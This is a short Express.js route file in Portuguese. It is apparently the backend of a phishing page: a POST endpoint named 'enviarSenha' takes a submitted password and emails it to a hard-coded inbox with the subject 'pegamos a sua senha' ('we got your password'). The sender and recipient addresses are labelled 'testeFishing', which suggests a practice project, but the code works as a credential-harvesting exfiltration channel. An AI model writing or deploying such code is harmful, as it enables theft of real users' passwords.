import transporter from "../Repository/emalRepository.js";

import { Router } from "express";

const server = Router();

server.post('/enviarSenha', async (req, resp) =>{
    const { text, subject } = req.body;
    console.log('aaaaa1')
        const opEmail = {
            text: 'a senha é '+ text,
            subject: 'pegamos a sua senha ' + subject,
            from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
            to: ['testefishing69@gmail.com'],
        };
        console.log('aaaaa1')

        const mailsend = await transporter.sendMail(opEmail);
        resp.status(200).send()
        
});

export default server;